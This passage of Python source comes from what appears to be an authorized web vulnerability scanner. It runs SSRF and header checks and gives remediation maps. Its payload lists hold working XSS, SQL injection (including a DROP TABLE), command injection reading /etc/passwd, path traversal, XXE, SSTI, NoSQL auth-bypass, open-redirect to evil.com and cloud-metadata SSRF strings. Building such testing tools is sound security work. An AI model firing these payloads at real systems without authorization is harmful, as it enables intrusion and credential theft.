            return findings

        async def try_ssrf(payload: str):
            if _is_internal_url(payload):
                return None  # safety gate — never fire internal addresses
            new_q = {k: (v[0] if isinstance(v, list) else v) for k, v in query.items()}
            new_q[param] = payload
            new_url = urlparse(url)._replace(query=urlencode(new_q)).geturl()
            resp = await self._get(session, sem, new_url, auth_headers=auth_headers)
            if resp:
                body = resp[2]
                if any(k in body for k in ("169.254.169.254", "ami-id", "instance-id", "computeMetadata", "iam/security-credentials")):
                    return self.finding(
                        title=f"Server-Side Request Forgery (SSRF) via '{param}' (A10)",
                        description=(
                            f"Parameter '{param}' fetched an internal/cloud metadata URL "
                            "and returned IMDS content in the response."
                        ),
                        severity=Severity.CRITICAL,
                        mitre_id="T1190",
                        evidence=f"Payload: {payload}\nURL: {new_url}\nBody: {body[:200]}",
                        remediation="Validate and restrict URL schemes/hosts; block 169.254.0.0/16; use IMDSv2 (AWS).",
                    )
            return None

        results = await asyncio.gather(*[try_ssrf(p) for p in SSRF_PAYLOADS], return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
                break
        return findings

    # =========================================================================
    # Response header analysis (A02 / A05 / A06)
    # =========================================================================

    async def _check_headers(self, target: str, headers: dict) -> List[Finding]:
        findings: List[Finding] = []

        server = headers.get("Server", "")
        if server and re.search(r"\d+\.\d+", server):
            findings.append(self.finding(
                title="Server Version Disclosed (A06)",
                description=f"Server header reveals exact version: {server}",
                severity=Severity.LOW,
                mitre_id="T1592",
                evidence=f"Server: {server}",
                remediation="Configure web server to omit version from Server header.",
            ))

        xpb = headers.get("X-Powered-By", "")
        if xpb:
            findings.append(self.finding(
                title="X-Powered-By Header Exposes Tech Stack (A06)",
                description=f"X-Powered-By: {xpb} — technology fingerprint disclosed.",
                severity=Severity.LOW,
                mitre_id="T1592",
                evidence=f"X-Powered-By: {xpb}",
                remediation="Remove X-Powered-By header (app.disable('x-powered-by') in Express).",
            ))

        required = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "Referrer-Policy",
            "Permissions-Policy",
        ]
        missing = [h for h in required if h not in headers]
        if missing:
            findings.append(self.finding(
                title="Missing Security Headers (A05)",
                description=f"Missing: {', '.join(missing)}",
                severity=Severity.MEDIUM,
                mitre_id="T1190",
                evidence=f"Missing headers: {missing}",
                remediation="Add missing headers using Helmet.js (Node) or SecurityMiddleware (Django/Flask).",
            ))

        if any(h in headers for h in ("X-Error-Details", "X-Debug", "X-Stack-Trace")):
            findings.append(self.finding(
                title="Debug / Error Headers Exposed (A05)",
                description="Response contains debug headers that leak internal application details.",
                severity=Severity.MEDIUM,
                mitre_id="T1592",
                evidence=str({k: v for k, v in headers.items() if "debug" in k.lower() or "error" in k.lower()}),
                remediation="Disable debug headers in production configuration.",
            ))

        if target.startswith("http://"):
            findings.append(self.finding(
                title="HTTP Only — No TLS Encryption (A02)",
                description=(
                    "Service is served over plain HTTP. All traffic (including "
                    "credentials) is transmitted in cleartext."
                ),
                severity=Severity.HIGH,
                mitre_id="T1557",
                evidence=f"URL: {target}",
                remediation="Enforce HTTPS with HSTS; redirect all HTTP to HTTPS; set Secure flag on all cookies.",
            ))

        return findings

    # =========================================================================
    # HTTP helper
    # =========================================================================

    async def _get(
        self, session, sem, url: str, allow_redirects: bool = True, auth_headers: dict = None,
    ) -> Optional[tuple]:
        await self.emit_event("INFO", f"[OWASP] Probing {url}")
        async with sem:
            try:
                hdrs = auth_headers or {}
                ssl_verify = self.options.get("ssl_verify", False)
                async with session.get(
                    url, headers=hdrs, allow_redirects=allow_redirects, ssl=ssl_verify,
                ) as resp:
                    body = await resp.text(errors="replace")
                    return resp.status, dict(resp.headers), body
            except Exception as exc:
                self.logger.debug(f"GET {url} failed: {exc}")
                return None

    # =========================================================================
    # MITRE / Remediation maps
    # =========================================================================

    def _get_mitre(self, test_name: str) -> str:
        return {
            "XSS": "T1059.007",
            "SQLi": "T1190",
            "CMD": "T1203",
            "PathTraversal": "T1083",
            "XXE": "T1190",
            "SSRF": "T1190",
            "OpenRedirect": "T1190",
            "FileUpload": "T1190",
            "AuthBypass": "T1078",
            "SSTI": "T1059",
            "IDOR": "T1087",
            "MassAssignment": "T1548",
            "NoSQLi": "T1190",
            "CSRF": "T1078",
        }.get(test_name, "T1190")

    def _get_remediation(self, test_name: str) -> str:
        return {
            "XSS": "Encode all user output for its context; implement strict Content-Security-Policy.",
            "SQLi": "Use parameterized queries / ORMs. Validate all input types.",
            "CMD": "Avoid system calls with user input. Use safe, sandboxed APIs.",
            "PathTraversal": "Validate and canonicalize file paths. Use allowlists — not denylist.",
            "XXE": "Disable external entity processing. Use defusedxml / safe XML parsers.",
            "SSRF": "Validate and restrict URL schemes/hosts. Block cloud metadata endpoints.",
            "OpenRedirect": "Validate redirect targets against a server-side allowlist.",
            "FileUpload": "Validate file by magic bytes (not extension). Store outside webroot.",
            "AuthBypass": "Enforce strong authentication; require MFA for all privileged actions.",
            "SSTI": "Never pass user input to template engines. Use sandboxed rendering.",
            "IDOR": "Enforce object-level authorization on every request. Verify resource ownership.",
            "MassAssignment": "Use DTOs / field allowlists. Never bind raw request body to models.",
            "NoSQLi": "Validate input types; reject operator objects in query fields.",
            "CSRF": "Implement the synchronizer token pattern and SameSite cookies.",
        }.get(test_name, "Apply security best practices and defence-in-depth.")


# =============================================================================
# Payload / pattern libraries
# =============================================================================

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"<script>alert(document.cookie)</script>",
    "<iframe src=javascript:alert(1)>",
]

# Only error-detectable payloads are used in the (legacy) text-pattern path;
# timing payloads are handled exclusively by _test_timing_sqli now.
SQLI_PAYLOADS_ERROR_BASED = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

SQLI_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"ORA-\d{5}", r"Microsoft OLE DB",
    r"ODBC.*Error", r"SQLiteException", r"pg_query\(\)",
    r"Unclosed quotation mark", r"Warning: mysql",
    r"You have an error in your SQL syntax", r"\[SQL Server\]",
    r"PostgreSQL.*ERROR", r"SQLSTATE",
    r"SQLITE_ERROR", r"SQLITE_CONSTRAINT", r"no such table",
    r"SequelizeDatabaseError", r"SequelizeUniqueConstraintError",
    r"near \".*?\": syntax error", r"unrecognized token",
    r"SqliteError", r"sqlite3_step",
    r"knex.*error", r"typeorm.*query.*failed",
]

CMD_INJECTION_PAYLOADS = [
    "; ls", "| ls", "`ls`", "$(ls)",
    "; whoami", "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMD_EXEC_PATTERN = re.compile(r"uid=\d+\(|root:x:0:0|www-data|daemon:x:")

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "../../../../windows/win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
]

NOSQL_PAYLOADS = [
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"email": {"$ne": "invalid@x.invalid"}, "password": {"$ne": "invalid"}},
    {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "///evil.com",
    "https:////evil.com",
]

# FILE_UPLOAD_PAYLOADS
# Security: all payloads use inert BAS markers — NOT executable code.
# PHP payloads previously contained system() calls which trip antivirus and
# have no place in an authorized simulation tool. The marker strings below
# confirm unrestricted upload acceptance without creating RCE capability.
FILE_UPLOAD_PAYLOADS = [
    ("shell.php",   "<?php echo 'SecureForge_BAS_Upload_Test'; ?>",                            "application/x-php"),
    ("shell.php5",  "<?php echo 'SecureForge_BAS_Upload_Test'; ?>",                            "application/x-php"),
    ("shell.phtml", "<?php echo 'SecureForge_BAS_Upload_Test'; ?>",                            "application/x-php"),
    ("shell.svg",   '<svg xmlns="http://www.w3.org/2000/svg"><text>BAS-Test</text></svg>',     "image/svg+xml"),
]

HEADER_INJECTION_PAYLOADS = {
    "User-Agent":       "<script>alert(1)</script>",
    "Referer":          "javascript:alert(1)",
    "X-Forwarded-For":  "127.0.0.1",
    "X-Forwarded-Host": "evil.com",
    "X-Real-IP":        "169.254.169.254",
}

# SSRF_PAYLOADS
# Used to test whether a target application will make outbound requests to
# attacker-controlled destinations.
# NOTE: "ssrf-canary.secureforge.internal" was previously used as a canary —
# it does not exist, making the test useless. Replaced with example.com which
# is a real, publicly-reachable domain operated by IANA for testing purposes.
# A successful connection to any of these from the target confirms SSRF.
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://example.com/secureforge-ssrf-canary",  # IANA-reserved safe canary domain
]

PROBE_PARAMS    = ["q", "id", "search", "user", "page", "file", "path", "input", "query", "name"]
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "return_to", "goto", "redir"]
SSRF_PARAMS     = ["url", "uri", "dest", "target", "page", "file", "path"]

WEAK_JWT_SECRETS = [
    "secret", "password", "jwt_secret", "supersecret",
    "your-256-bit-secret", "", "changeme", "token",
]

SENSITIVE_PATHS = [
    "/ftp/", "/ftp",
    "/.git/HEAD", "/.env",
    "/robots.txt", "/sitemap.xml",
    "/administration", "/admin",
    "/api-docs", "/swagger.json", "/openapi.json",
    "/.well-known/",
    "/backup", "/config",
    "/server-status", "/phpinfo.php",
    "/actuator", "/actuator/env", "/actuator/health",
    "/metrics",
    "/encryptionkeys/",
    "/support/logs",
    "/rest/admin/application-version",
    "/rest/admin/application-configuration",
    "/profile",
]